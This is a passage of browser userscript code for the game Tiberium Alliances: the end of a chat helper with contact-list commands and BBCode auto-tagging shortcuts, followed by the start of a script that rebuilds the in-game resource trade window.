					alert("Type /chelp in any text box to show this message.\n\nEnter key in chat:\tsearches your chat string for Urls and Coords and wraps them before submission.\n\nAlt + 1\t:\tsearches for Urls and Coords in a message or forum post and tags accordingly. Cursor is moved to the beginning.\nAlt + 2\t:\tManual URL insertion popup window\nAlt + 0\t:\tclears all tags\n\nWord wraps: tags a selected word -or- tags the word where the cursor is (if chat is empty or you hit <space> empty tags are inserted).\nAttempts to preserve cursor and scroll position.\n|\tAlt + p or Alt + 3\t:\tplayer tags\n|\tAlt + a or Alt + 4\t:\talliance tags\n|\tAlt + b\t\t\t:\tbold tags\n|\tAlt + i\t\t\t:\titalic tags\n|\tAlt + u\t\t\t:\tunderline tags\n|__\tAlt + s\t\t\t:\tstrikethrough tags\n\nContact list commands:\n/list -or- /contacts\n/add\n/del\n/del all - wipes your whole contact list"); 
				} 
				 
				function saveData() { 
					saveObj.contacts = contacts; 
					var jString = JSON.stringify(saveObj); 
					chlog("saveJSON: "+jString, 1); 
					localStorage.setItem('chatHelper', jString); 
				} 
 
				function loadData() { 
					try{ 
						if (localStorage.getItem('myContacts')) { //should be removed eventually 
							var dat = localStorage.getItem('myContacts'); 
							dat = dat.split(','); 
							saveObj.contacts = dat; 
							 
							//unset old storage  
							localStorage.removeItem('myContacts'); 
						} else if (localStorage.getItem('chatHelper')) { 
							var saveObjTmp = JSON.parse(localStorage.getItem('chatHelper')); 
							if (saveObjTmp.saveObjVer != window.chatHelper_version){ 
								//version changed 
								var va = saveObjTmp.saveObjVer.split('.'); 
								var vb = window.chatHelper_version.split('.'); 
								 
								if (va[0] != vb[0]){ //major version change 
									chlog("ChatHelper: Major version change from v"+va[0]+"."+va[1]+"."+va[2]+" to v"+vb[0]+"."+vb[1]+"."+vb[2]); 
								} else { 
									if (va[1] != vb[1]){ //minor version change 
										chlog("ChatHelper: Minor version change from v"+va[0]+"."+va[1]+"."+va[2]+" to v"+vb[0]+"."+vb[1]+"."+vb[2]); 
									} else { 
										if (va[2] != vb[2]){ //patch release 
											chlog("ChatHelper: Version Patched from v"+va[0]+"."+va[1]+"."+va[2]+" to v"+vb[0]+"."+vb[1]+"."+vb[2]); 
										} 
									} 
								} 
							} else { 
								//no version change 
								localStorage.getItem('chatHelper'); 
							} 
							saveObj = saveObjTmp; 
						} 
						contacts = saveObj.contacts; 
						saveData(); 
					}catch(err){ 
						chlog(err); 
					} 
				} 
				 
				if (!localStorage.myContacts) { 
					chlog("Deprecated contacts variable does not exist.",1); 
					loadData(); 
				} else { 
					//contacts = loadData(); 
					loadData(); 
					chlog("Contacts: " + contacts, 1); 
				} 
				 
				function saveContact(fr) { 
					chlog("Number of contacts == "+contacts.length,1); 
					contacts.push(fr); 
					chlog(fr + " added to contacts list.",1); 
					saveData(); 
				} 
				 
				function caseInsensitiveSort(a, b) { 
					a = a.toLowerCase(); 
					b = b.toLowerCase(); 
					if (a > b) 
						return 1; 
					if (a < b) 
						return -1; 
					return 0; 
				} 
				 
				function listContacts() { 
					var len = contacts.length; 
					var a = contacts.sort(caseInsensitiveSort); 
					if (len == 1) { 
						alert(len + " Contact:\n\n" + a.join("\n") + "\n"); 
					} else if (len > 1) { 
						alert(len + " Contacts:\n\n" + a.join("\n") + "\n"); 
					} else { 
						var p = prompt("Your contacts list is empty.\n\nType a name here to add a contact:\n", ""); 
						if (p) { 
							saveContact(p); 
						} 
					} 
				} 
				 
				function deleteContact(fr) { 
					if (fr === "all") { 
						contacts = []; 
						chlog("All contacts deleted",1); 
						saveData(); 
					} else { 
						var ind = contacts.indexOf(fr); 
						if (ind > -1) { 
							saveObj.contacts = contacts.splice(ind, 1); 
							saveData(); 
							chlog(contacts,1); 
							chlog(fr + " deleted from contacts list."); 
						} 
					} 
				} 
				function keyUpTimer(kEv) { 
					kEv = kEv || window.event; 
					if (kEv.target.type === "text" && kEv.target.value != '') { 
						var inputField = kEv.target; 
						var inText = inputField.value; 
						var len = inText.length; 
						var sub; 
						var kc = kEv.keyCode; 
						if (len >= 10 && inText.match(/^(\/whisper)/) != null) { 
							isWhisp = true; 
						} 
						if (isWhisp && len >= 10 && !kEv.altGraphKey && !kEv.ctrlKey && !kEv.altKey && kc > 47 && kc < 91) { 
							chlog("keyUpTimer keyCode =="+kEv.keyCode,1); 
							sub = inText.substr(9); 
							if (!sub.match(/\s/)) { 
								for (var i = 0; i < contacts.length; i++) { 
									var slen = sub.length; 
									if (contacts[i][slen - 1] === sub[slen - 1] && contacts[i].substr(0, slen) == sub) { 
										inputField.value = "/whisper " + contacts[i] + " "; 
										inputField.setSelectionRange(10 + slen - 1, 10 + contacts[i].length, "forward"); 
									} 
								} 
							} else { 
								isWhisp = false; 
							} 
						} else { 
							isWhisp = false; 
						} 
					} 
				} 
				 
				document.onkeyup = function (kEv) { 
					clearTimeout(timer); 
					timer = setTimeout(function () { 
							keyUpTimer(kEv); 
						}, onkeyupDelay); 
				} 
				 
				function delayedConfirm() { 
					if (confirm("Add " + _sub + " to your contacts list?\n\nYou can see a list of your contacts by typing /list")) { 
						saveContact(_sub); 
					} 
				} 
				 
				function autoTag(inputField, inText) { 
					var isUrl = false; 
					var lookBack; 
					//the code here is mostly from Bruce Doan: http://userscripts.org/scripts/show/151965 
					////auto url 
					inText = inText.replace(/(\[url\])*(https?:\/\/)([\da-z\.-]+)(\.[a-z]{2,6})([\/\w\.\-\=\?\&\%\+\|#:;,~\*\(\)\$]*)*\/?(\[\/url\])*/gi, function () { 
							var result = new Array(); 
							var protocol = arguments[2].match(/https?:\/\//); 
							for (var i in arguments){ 
								chlog("autoTag url reg arg "+i + "= " + arguments[i],1); 
							} 
							result.push('[url]'); 
							result.push(arguments[2]); // http[s]:// 
							result.push(arguments[3]); // domain 
							result.push(arguments[4]); // ext 
							result.push(arguments[5]); // query string 
							result.push('[/url]'); 
							if (protocol === null){ 
								chlog("autotag url - no protocol",2); 
							} else { 
								isUrl = true; 
								chlog("bypassing coords tagging\n detected protocol = " + protocol,2); 
								 
							} 
							return result.join(''); 
						}); 
					////auto coords 
					if (!isUrl) { 
						chlog("checking for coords",1); 
						lookBack = inText.replace(/(\[coords\])?([#])?([0-9]{3,4})[:.]([0-9]{3,4})([:.]\w+)?(\[\/coords\])?/gi, function () { 
								for (var i in arguments){ 
									chlog("autoTag coords reg arg " + i + " = " + arguments[i],1); 
								} 
								var hashBefore = arguments[2]; 
								chlog("hashBefore "+hashBefore,1); 
								if (!hashBefore) { 
									chlog("no hash returning"); 
									var result = new Array(); 
									result.push('[coords]'); 
									result.push(arguments[3]); 
									result.push(':'); 
									result.push(arguments[4]); 
									if (arguments[5] != undefined) { 
										result.push(arguments[5].replace('.', ':')); 
									} 
									result.push('[/coords]'); 
									return result.join(''); 
								} else { 
									return arguments[0]; 
								} 
							}); 
						inText = lookBack; 
						chlog("lookedback",1); 
						chlog("LB string: "+lookBack,1); 
					} 
					// shorthand for player 
					inText = inText.replace(/\[p\]([a-z0-9_\-\s]+)\[\/p\]/gi, '[player]$1[/player]'); 
					// shorthand for alliance 
					inText = inText.replace(/\[a\]([a-z0-9_\-\s]+)\[\/a\]/gi, '[alliance]$1[/alliance]'); 
					 
					return inText; 
				} 
				 
				document.onkeydown = function (kEv) { 
					kEv = kEv || window.event; 
					 
					/* Tab key 
					if (kEv.keyCode == 9){ 
						chlog("Tab key pressed",1) 
						var input = qx.core.Init.getApplication().getChat().getChatWidget().getEditable(); // Input 
						kEv.preventDefault(); 
						kEv.stopPropagation(); 
					} 
					 */ 
					if (!kEv.shiftKey && kEv.keyCode === 13 && (kEv.target.type === "text" || kEv.target.type === "textarea")) { 
						var inputField = kEv.target; 
						var inText = inputField.value; 
						var add = inText.match(/^(\/add)/); 
						var del = inText.match(/^(\/del)/); 
						var showContacts = inText.match(/^((\/contacts)|(\/list))/); 
						var sub; 
						var cf; 
						if (inText.match(/^(\/whisper)/) != null || add != null) { 
							if (add != null) { 
								sub = inText.substr(5); 
							} else { 
								sub = inText.substr(9); 
							} 
							if (sub.match(/^(\w*)\s/)) { 
								//if space after player name (is a whisper or a typo) 
								var arr = sub.match(/^(\w*)/); 
								sub = arr[0].replace(/\s$/, ""); 
								if (contacts.indexOf(sub) == -1) { 
									//not in contacts list 
									_sub = sub; 
									setTimeout(delayedConfirm, 500); 
								} 
							} else if (contacts.indexOf(sub) == -1) { 
								//no message to send, not in contacts, promt to add, clear input 
								chlog("clearing input field",1); 
								inputField.focus(); //?necessary? 
								inputField.value = ""; 
								var cf = confirm("Add " + sub + " to your contacts list?\n\nYou can see a list of your contacts by typing /list"); 
								if (cf) { 
									saveContact(sub); 
									return false; 
								} else { 
									return false; 
								} 
							} else if (sub && contacts.indexOf(sub) > -1) { 
								//not a whisper, reject duplicate contact 
								alert(sub + " is already in your contacts list."); 
							} 
						} 
						//remove contact(s) 
						if (del) { 
							sub = inText.substr(5); 
							chlog("clearing input field",1); 
							inputField.value = ""; 
							if ((contacts.indexOf(sub) > -1 || sub == "all") && confirm("Really delete " + sub + " from your contacts?")) { 
								deleteContact(sub); 
							} else { 
								alert(sub + " is not in your contacts list."); 
							} 
							return false; 
						} 
						// show contacts list 
						if (showContacts) { 
							chlog("clearing input field",1); 
							inputField.value = ""; 
							listContacts(); 
							return false; 
							 
						} 
						// /chelp dialog 
						if (inText.length === 6 && inText.match(/^(\/chelp)/) != null) { 
							chlog("clearing input field",1); 
							inputField.value = ""; 
							showHelp(); 
							return false; 
						} 
						 
						if (inputField != null && inputField.type === "text" && inText !== "") { 
							chlog("onEnter auto-tagging",1); 
							 
							inText = autoTag(inputField, inText); //auto-tag 
							 
							if (inText !== inputField.value) { 
								inputField.value = inText; 
							} 
						} 
					} 
					 
					if (kEv.altKey && !kEv.shiftKey && !kEv.altGraphKey && !kEv.ctrlKey && kEv.target != null && (kEv.target.type === "textarea" || kEv.target.type === "text")) { 
						var inputField = kEv.target; 
						var inText = inputField.value; 
						// Alt key, not Ctrl or AltGr 
						if (kEv.altKey && !kEv.altGraphKey && !kEv.ctrlKey) { 
							var cc = kEv.charCode; 
							var kc = kEv.keyCode; 
							chlog("charCode == "+cc,1); 
							chlog("keyCode == "+kc,1); 
 
							/* Alt+1 for auto Coordinates/Urls in message body */ 
							if (inputField.type === "textarea" && (cc === 49 || kc === 49)) { 
								var pos = getCaretPos(inputField); 
								chlog("attempting Alt+1 message auto-tag",1); 
								if (inputField != null) { 
									var st = inputField.scrollTop; 
									 
									inText = autoTag(inputField, inText); //auto-tag 
									 
									if (inText !== "" || inText !== inputField.value) { 
										inputField.value = inText; 
										inputField.scrollTop = st; 
										moveCaret(inputField, 0); 
									} 
								} 
							} 
							/* Alt+2 for URLs fallback */ 
							if (cc === 50 || kc === 50) { 
								if (inputField != null) { 
									var url = prompt("Website (Syntax: google.com or www.google.com)", ""); 
									if (url != null) { 
										inputField.value += '[url]' + url + '[/url]'; 
									} 
								} 
							} 
							/* Alt+3 or Alt+p for players */ 
							if ((cc === 112 || kc === 80) || (cc === 51 || kc === 51)) { 
								tagWith('[player]', inputField); 
								if (window.chatHelper_suppressBrowserAltKeys) 
									return false; 
							} 
							/* Alt+4 or Alt+a for alliances */ 
							if ((cc === 97 || kc === 65) || (cc === 52 || kc === 52)) { 
								tagWith('[alliance]', inputField); 
								if (window.chatHelper_suppressBrowserAltKeys) 
									return false; 
							} 
							/* Alt+0 to clear tags */ 
							if (cc === 48 || kc === 48) { 
								if (inputField.type === 'textarea') 
									var st = inputField.scrollTop; 
								if (inputField != null) { 
									inText = inText.replace(/\[\/?coords\]/gi, ''); 
									inText = inText.replace(/\[\/?url\]/gi, ''); 
									inText = inText.replace(/\[\/?player\]/gi, ''); 
									inText = inText.replace(/\[\/?alliance\]/gi, ''); 
									inText = inText.replace(/\[\/?b\]/gi, ''); 
									inText = inText.replace(/\[\/?i\]/gi, ''); 
									inText = inText.replace(/\[\/?u\]/gi, ''); 
									inText = inText.replace(/\[\/?s\]/gi, ''); 
									inputField.value = inText; 
								} 
								if (inputField.type === 'textarea') 
									inputField.scrollTop = st; 
							} 
							/* Alt+b for bold */ 
							if (cc === 98 || kc === 66) { 
								tagWith('[b]', inputField); 
								if (window.chatHelper_suppressBrowserAltKeys) 
									return false; 
							} 
							/* Alt+i for italics */ 
							if (cc === 105 || kc === 73) { 
								tagWith('[i]', inputField); 
								if (window.chatHelper_suppressBrowserAltKeys) 
									return false; 
							} 
							/* Alt+u for underline */ 
							if (cc === 117 || kc === 85) { 
								tagWith('[u]', inputField); 
								if (window.chatHelper_suppressBrowserAltKeys) 
									return false; 
							} 
							/* Alt+s for strikethrough */ 
							if (cc === 115 || kc === 83) { 
								tagWith('[s]', inputField); 
								if (window.chatHelper_suppressBrowserAltKeys) 
									return false; 
							} 
						} 
					} 
				} 
			} 
		} catch (err) { 
			chlog("createchatHelper: "+ err,1); 
			console.error(err); 
		} 
		 
		function chatHelper_checkIfLoaded() { 
			try { 
				if (typeof qx !== 'undefined') { 
					createchatHelper(); 
				} else { 
					window.setTimeout(chatHelper_checkIfLoaded, 1333); 
				} 
			} catch (err) { 
				console.log("chatHelper_checkIfLoaded: ", err); 
			} 
		} 
		window.setTimeout(chatHelper_checkIfLoaded, 1333); 
	}; 
	try { 
		var chatHelper = document.createElement("script"); 
		chatHelper.innerHTML = "(" + chatHelper_main.toString() + ")();"; 
		chatHelper.type = "text/javascript"; 
		document.getElementsByTagName("head")[0].appendChild(chatHelper); 
	} catch (err) { 
		console.log("chatHelper: init error: ", err); 
	} 
})(); 




// ==UserScript== 
// @name Tiberium Alliances - New Resource Trade Window 
// @description Implements a new TradeOverlay class, allowing you to select individual, multiple or all bases to transfer resources from 
// @namespace NewTradeOverlay 
// @include https://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// @version 1.4.7 
// @author Chiantii 
// @updateURL https://userscripts.org/scripts/source/168297.meta.js 
// @downloadURL https://userscripts.org/scripts/source/168297.user.js 
// ==/UserScript== 
(function () { 
	var NewTradeOverlay_main = function () { 
		console.log('NewTradeOverlay loaded'); 
		function CreateNewTradeOverlay() { 
			qx.Class.undefine("webfrontend.gui.trade.TradeOverlay"); 
			qx.Class.define("webfrontend.gui.trade.TradeOverlay", { 
				type : "singleton", 
				extend : webfrontend.gui.OverlayWindow, 
				construct : function () { 
					webfrontend.gui.OverlayWindow.call(this); 
					this.set({ 
						autoHide : false 
					}); 
					this.clientArea.setLayout(new qx.ui.layout.HBox()); 
					this.clientArea.setMargin(0); 
					this.clientArea.setWidth(464); 
					this.setTitle(qx.locale.Manager.tr("tnf:trade window title")); 
					this.clientArea.add(new qx.ui.core.Spacer(), { 
						flex : 1 
					}); 
					this.clientArea.add(this.tradeWindow()); 
					this.clientArea.add(new qx.ui.core.Spacer(), { 
						flex : 1 
					}); 
					this.tradeConfirmationWidget = new webfrontend.gui.widgets.confirmationWidgets.TradeConfirmationWidget(); 
				}, 
				members : { 
					activated : false, 
					transferWindowTableSelectedRows : null, 
					modifier : null, 
					tradeWindowTable : null, 
					tableColumnModel : null, 
					resourceTransferType : null, 
					transferAmountTextField : null, 
					largeTiberiumImage : null, 
					costToTradeLabel : null, 
					transferFromBaseLabel : null, 
					totalResourceAmount : null, 
					selectedRowData : null, 
					selectedRow : null, 
					tradeButton : null, 
					tenPercentButton : null, 
					twentyFivePercentButton : null, 
					fiftyPercentButton : null, 
					seventyFivePercentButton : null, 
					oneHundredPercentButton : null, 
					resourceSelectionRadioButtons : null, 
					selectAllNoneButton : null, 
					userDefinedMinimumAmount : -1, 
					userDefinedMaxDistance : -1, 
					tradeConfirmationWidget : null, 
					activate : function () { 
						if (!this.activated) { 
							ClientLib.Vis.VisMain.GetInstance().PlayUISound("audio/ui/OpenWindow"); 
							phe.cnc.base.Timer.getInstance().addListener("uiTick", this._onTick, this); 
							this.selectedRowData = null; 
							this.selectedRow = null; 
							this.transferWindowTableSelectedRows = []; 
							this.transferAmountTextField.setValue(""); 
							this.costToTradeLabel.setValue("0"); 
							this.userDefinedMinimumAmount = -1; 
							this.userDefinedMaxDistance = -1; 
							this.resourceTransferType = ClientLib.Base.EResourceType.Tiberium; 
							this.tradeWindowTable.resetCellFocus(); 
							this.tradeWindowTable.resetSelection(); 
							this.transferFromBaseLabel.setValue(qx.locale.Manager.tr("tnf:select base for transfer")); 
							this.resourceSelectionRadioButtons.resetSelection(); 
							this.largeTiberiumImage.setSource("webfrontend/ui/common/icon_res_large_tiberium.png"); 
							this.TableRowFilter(); 
							this.tableColumnModel.sortByColumn(2, true); 
							qx.locale.Manager.getInstance().addTranslation("en_US", { 
								"tnf:select all" : "Select All" 
							}); 
							qx.locale.Manager.getInstance().addTranslation("en_US", { 
								"tnf:select none" : "Select None" 
							}); 
							qx.locale.Manager.getInstance().addTranslation("en_US", { 
								"tnf:cannot manually modify" : "Cannot be modified with multiple rows selected" 
							}); 
							qx.locale.Manager.getInstance().addTranslation("en_US", { 
								"tnf:trading with multiple bases" : "Trading with multiple bases" 
							}); 
							qx.locale.Manager.getInstance().addTranslation("en_US", { 
								"tnf:percent buttons" : "Please use one of the Percent buttons" 
							}); 
							this.activated = true; 
						} 
					}, 
					deactivate : function () { 
						if (this.activated) { 
							phe.cnc.base.Timer.getInstance().removeListener("uiTick", this._onTick, this); 
							this.tradeWindowTable.resetSelection(); 
							this.tradeWindowTable.resetCellFocus(); 
							this.transferAmountTextField.setValue(""); 
							this.transferWindowTableSelectedRows = []; 
							this.costToTradeLabel.setValue(""); 
							this.selectedRow = null; 
							this.selectedRowData = null; 
							this.modifier = 1; 
							this.activated = false; 
						} 
					}, 
					getFilterMinimimAmount : function () { 
						return this.userDefinedMinimumAmount; 
					}, 
					getFilterDistanceLimit : function () { 
						return this.userDefinedMaxDistance; 
					}, 
					tradeWindow : function () { 
						var tradeWindowContainer = new qx.ui.container.Composite(new qx.ui.layout.VBox(2)).set({ 
							marginTop : 10, 
							marginBottom : 10, 
							marginLeft : 4 
						}); 
 
						tradeWindowContainer.add(new qx.ui.core.Spacer(), { 
							flex : 1 
						}); 
 
						var selectResourcesLabel = new qx.ui.basic.Label(qx.locale.Manager.tr("tnf:select resources:")).set({ 
							textColor : "text-label", 
							alignY : "middle", 
							font : "font_size_13" 
						}); 
						var resourceSelectionContainer = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)).set({ 
							height : 26 
						}); 
						var tiberiumToggleButton = new qx.ui.form.ToggleButton(null, "webfrontend/ui/common/icon_res_large_tiberium.png").set({ 
							appearance : "button-toggle", 
							width : 84 
						}); 
						tiberiumToggleButton.setUserData("key", ClientLib.Base.EResourceType.Tiberium); 
						var tiberiumImage = new qx.ui.basic.Image("webfrontend/ui/common/icn_res_tiberium.png").set({ 
							width : 24, 
							height : 24, 
							scale : true 
						}); 
						var crystalToggleButton = new qx.ui.form.ToggleButton(null, "webfrontend/ui/common/icon_res_large_crystal.png").set({ 
							appearance : "button-toggle", 
							width : 84 
						}); 
						crystalToggleButton.setUserData("key", ClientLib.Base.EResourceType.Crystal); 
						var crystalImage = new qx.ui.basic.Image("webfrontend/ui/common/icn_res_chrystal.png").set({ 
							width : 24, 
							height : 24, 
							scale : true 
						}); 
						resourceSelectionContainer.add(new qx.ui.core.Spacer(), { 
							flex : 1 
						}); 
						resourceSelectionContainer.add(selectResourcesLabel); 
						resourceSelectionContainer.add(tiberiumToggleButton); 
						resourceSelectionContainer.add(new qx.ui.core.Spacer().set({ 
							width : 2 
						})); 
						resourceSelectionContainer.add(crystalToggleButton); 
						resourceSelectionContainer.add(new qx.ui.core.Spacer(), { 
							flex : 1 
						}); 
						this.resourceSelectionRadioButtons = new qx.ui.form.RadioGroup(tiberiumToggleButton, crystalToggleButton); 
						this.resourceSelectionRadioButtons.addListener("changeSelection", this.ChangeResourceType, this); 
 
						tradeWindowContainer.add(resourceSelectionContainer); 
 
						var currentServer = ClientLib.Data.MainData.GetInstance().get_Server(); 
						var tradeCostToolTip = qx.locale.Manager.tr("tnf:trade costs %1 (+%2 per field)", currentServer.get_TradeCostMinimum(), currentServer.get_TradeCostPerField()); 
						var searchContainer = new qx.ui.container.Composite(new qx.ui.layout.VBox(2)); 
						var searchBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
						var minimumAmountLabel = new qx.ui.basic.Label(qx.locale.Manager.tr("tnf:minimum amount:")).set({ 
							textColor : "text-label", 
							alignY : "middle", 
							font : "font_size_13" 
						}); 
						this.minimumAmountTextField = new qx.ui.form.TextField("").set({ 
							toolTipText : qx.locale.Manager.tr("tnf:only numbers allowed") 
						}); 
						this.minimumAmountTextField.setFilter(/[0-9]/); 
						this.minimumAmountTextField.setMaxLength(12); 
						var maxDistanceLabel = new qx.ui.basic.Label(qx.locale.Manager.tr("tnf:distance limit:")).set({ 
							textColor : "text-label", 
							alignY : "middle", 
							font : "font_size_13", 
							toolTipText : tradeCostToolTip 
						}); 
						this.maxDistanceTextField = new qx.ui.form.TextField("").set({ 
							toolTipText : qx.locale.Manager.tr("tnf:only numbers allowed") 
						}); 
						this.maxDistanceTextField.setFilter(/[0-9]/); 
						this.maxDistanceTextField.setMaxLength(3); 
						searchBox.add(minimumAmountLabel); 
						searchBox.add(this.minimumAmountTextField); 
						searchBox.add(new qx.ui.core.Spacer(), { 
							flex : 1 
						}); 
						searchBox.add(maxDistanceLabel); 
						searchBox.add(this.maxDistanceTextField); 
						searchBox.add(new qx.ui.core.Spacer(), { 
							flex : 2 
						}); 
 
						searchContainer.add(searchBox); 
 
						var searchButton = new webfrontend.ui.SoundButton(qx.locale.Manager.tr("tnf:search")).set({ 
							width : 300, 
							maxWidth : 300, 
							marginBottom : 8, 
							marginTop : 4, 
							alignX : "center" 
						}); 
						searchButton.addListener("execute", this.TableRowFilter, this); 
						searchContainer.add(searchButton); 
 
						//tradeWindowContainer.add(searchContainer); 
 
						this.selectAllNoneButton = new webfrontend.ui.SoundButton(qx.locale.Manager.tr("tnf:select all")).set({ 
							enabled : true, 
							//appearance: "button-forum-light", 
							//textColor: "text-label", 
							width : 160 
						}); 
 
						this.selectAllNoneButton.addListener("click", this.SelectAllRows, this); 
 
						tradeWindowContainer.add(this.selectAllNoneButton); 
 
						this.tableColumnModel = new webfrontend.data.SimpleColFormattingDataModel(); 
						this.tableColumnModel.setColumns([qx.locale.Manager.tr("tnf:base"), qx.locale.Manager.tr("tnf:distance"), qx.locale.Manager.tr("tnf:$ / 1000"), qx.locale.Manager.tr("tnf:amount"), "Amount", "Max", "ID"], ["Base", "Distance", "Credits", "AmountDesc", "Amount", "Max", "ID"]); 
						this.tableColumnModel.setColumnSortable(0, true); 
						this.tableColumnModel.setColumnSortable(1, true); 
						this.tableColumnModel.setColumnSortable(2, true); 
						this.tableColumnModel.setColumnSortable(3, true); 
						this.tableColumnModel.setSortMethods(3, this.AmountSort); 
						this.tradeWindowTable = new webfrontend.gui.trade.TradeBaseTable(this.tableColumnModel).set({ 
							statusBarVisible : false, 
							columnVisibilityButtonVisible : false, 
							maxHeight : 300 
						}); 
						this.tradeWindowTable.addListener("cellClick", this.TradeWindowTableCellClick, this); 
						this.tradeWindowTable.getSelectionModel().setSelectionMode(qx.ui.table.selection.Model.MULTIPLE_INTERVAL_SELECTION); 
						this.tradeWindowTable.setDataRowRenderer(new webfrontend.gui.trade.TradeBaseTableRowRenderer(this.tradeWindowTable)); 
						this.tradeWindowTable.showCellToolTip = true; 
						var tradeWindowTableColumnModel = this.tradeWindowTable.getTableColumnModel(); 
						tradeWindowTableColumnModel.setDataCellRenderer(0, new qx.ui.table.cellrenderer.String()); 
						tradeWindowTableColumnModel.setDataCellRenderer(1, new qx.ui.table.cellrenderer.Number()); 
						tradeWindowTableColumnModel.setDataCellRenderer(2, new qx.ui.table.cellrenderer.Number()); 
						tradeWindowTableColumnModel.setHeaderCellRenderer(2, new qx.ui.table.headerrenderer.Default()); 
						tradeWindowTableColumnModel.getHeaderCellRenderer(2).setToolTip(tradeCostToolTip); 
						tradeWindowTableColumnModel.setDataCellRenderer(3, new webfrontend.gui.trade.TradeBaseTableCellRenderer()); 
						tradeWindowTableColumnModel.setColumnWidth(0, 160); 
						tradeWindowTableColumnModel.setColumnWidth(1, 60); 
						tradeWindowTableColumnModel.setColumnWidth(2, 100); 
						tradeWindowTableColumnModel.setColumnVisible(4, false); 
						tradeWindowTableColumnModel.setColumnVisible(5, false); 
						tradeWindowTableColumnModel.setColumnVisible(6, false); 
						tradeWindowContainer.add(this.tradeWindowTable); 
 
						var transferAmountContainer = new qx.ui.container.Composite(new qx.ui.layout.VBox()); 
						var transferAmountBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(2)).set({ 
							minHeight : 36 
						}); 
						this.largeTiberiumImage = new qx.ui.basic.Image("webfrontend/ui/common/icon_res_large_tiberium.png").set({ 
							alignY : "middle", 
							width : 22, 
							height : 20, 
							scale : true 
						}); 
						this.transferFromBaseLabel = new qx.ui.basic.Label(qx.locale.Manager.tr("tnf:select base for transfer")).set({ 
							rich : true, 
							textColor : "text-label", 
							marginBottom : 2, 
							alignY : "middle", 
							maxWidth : 182 
						}); 
						this.transferAmountTextField = new qx.ui.form.TextField("").set({ 
							toolTipText : qx.locale.Manager.tr("tnf:only numbers allowed"), 
							enabled : false, 
							width : 208, 
							marginRight : 1 
						}); 
						this.transferAmountTextField.setFilter(/[0-9]/); 
						this.transferAmountTextField.setMaxLength(20); 
						this.transferAmountTextField.addListener("input", this.ResourceAmountChanged, this); 
						transferAmountBox.add(this.largeTiberiumImage); 
						transferAmountBox.add(this.transferFromBaseLabel); 
						var percentButtonsBox = new qx.ui.container.Composite(new qx.ui.layout.HBox()).set({ 
							marginTop : 2 
						}); 
						this.tenPercentButton = new webfrontend.ui.SoundButton("10%").set({ 
							enabled : false, 
							appearance : "button-forum-light", 
							textColor : "text-label", 
							width : 42 
						}); 
						this.tenPercentButton.addListener("execute", this.TenPercent, this); 
						this.twentyFivePercentButton = new webfrontend.ui.SoundButton("25%").set({ 
							enabled : false, 
							appearance : "button-forum-light", 
							textColor : "text-label", 
							width : 42 
						}); 
						this.twentyFivePercentButton.addListener("execute", this.TwentyFivePercent, this); 
						this.fiftyPercentButton = new webfrontend.ui.SoundButton("50%").set({ 
							enabled : false, 
							appearance : "button-forum-light", 
							textColor : "text-label", 
							width : 42 
						}); 
						this.fiftyPercentButton.addListener("execute", this.FiftyPercent, this); 
						this.seventyFivePercentButton = new webfrontend.ui.SoundButton("75%").set({ 
							enabled : false, 
							appearance : "button-forum-light", 
							textColor : "text-label", 
							width : 42 
						}); 
						this.seventyFivePercentButton.addListener("execute", this.SeventyFivePercent, this); 
						this.oneHundredPercentButton = new webfrontend.ui.SoundButton("100%").set({ 
							enabled : false, 
							appearance : "button-forum-light", 
							textColor : "text-label", 
							width : 42 
						}); 
						this.oneHundredPercentButton.addListener("execute", this.OneHundredPercent, this); 
						percentButtonsBox.add(this.tenPercentButton); 
						percentButtonsBox.add(this.twentyFivePercentButton); 
						percentButtonsBox.add(this.fiftyPercentButton); 
						percentButtonsBox.add(this.seventyFivePercentButton); 
						percentButtonsBox.add(this.oneHundredPercentButton); 
						transferAmountContainer.add(transferAmountBox); 
						transferAmountContainer.add(this.transferAmountTextField); 
						transferAmountContainer.add(percentButtonsBox); 
						var tradeCostContainer = new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({ 
							alignX : "center", 
							maxWidth : 148 
						}); 
						var tradeCostLabel = new qx.ui.basic.Label(qx.locale.Manager.tr("tnf:costs:")).set({ 
							textColor : "text-label", 
							marginBottom : 2, 
							font : "font_size_13_bold", 
							width : 148, 
							textAlign : "center" 
						}); 
						var tradeCostBox = new qx.ui.container.Composite(new qx.ui.layout.HBox()).set({ 
							alignX : "center", 
							allowGrowX : true, 
							marginTop : 10 
						}); 
						this.costToTradeLabel = new qx.ui.basic.Label().set({ 
							textColor : "text-value", 
							alignY : "middle", 
							font : "font_size_14_bold", 
							marginLeft : 3 
						}); 
						var dollarImage = new qx.ui.basic.Image("webfrontend/ui/common/icon_res_large_credits.png").set({ 
							width : 18, 
							height : 20, 
							scale : true, 
							AutoFlipH : false 
						}); 
						tradeCostBox.add(new qx.ui.core.Spacer(), { 
							flex : 1 
						}); 
						tradeCostBox.add(dollarImage); 
						tradeCostBox.add(this.costToTradeLabel); 
						tradeCostBox.add(new qx.ui.core.Spacer(), { 
							flex : 1 
						}); 
						this.tradeButton = new webfrontend.ui.SoundButton(qx.locale.Manager.tr("tnf:trade")).set({ 
							width : 196, 
							enabled : false 
						}); 
						this.tradeButton.addListener("execute", this.TradeWithBases, this); 
						tradeCostContainer.add(tradeCostLabel); 
						tradeCostContainer.add(tradeCostBox); 
						tradeCostContainer.add(this.tradeButton); 
						var tradeWindowCanvas = new qx.ui.container.Composite(new qx.ui.layout.Canvas()).set({ 
							decorator : new qx.ui.decoration.Background().set({ 
								backgroundRepeat : 'no-repeat', 
								backgroundImage : "webfrontend/ui/menues/resource_transfer/bgr_restransfer_summary.png" 
							}) 
						}); 
						tradeWindowCanvas.add(transferAmountContainer, { 
							left : 50, 
							top : 5 
						}); 
						tradeWindowCanvas.add(tradeCostContainer, { 
							left : 285, 
							top : 18 
						}); 
						tradeWindowCanvas.add(this.tradeButton, { 
							left : 134, 
							top : 100 
						}); 
						tradeWindowContainer.add(tradeWindowCanvas); 
						return tradeWindowContainer; 
					}, 
					TableRowFilter : function () { 
						var tableArray = []; 
						var currentCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
						if (currentCity != null) { 
							this.userDefinedMaxDistance = this.maxDistanceTextField.getValue() == "" ? -1 : parseInt(this.maxDistanceTextField.getValue(), 10); 
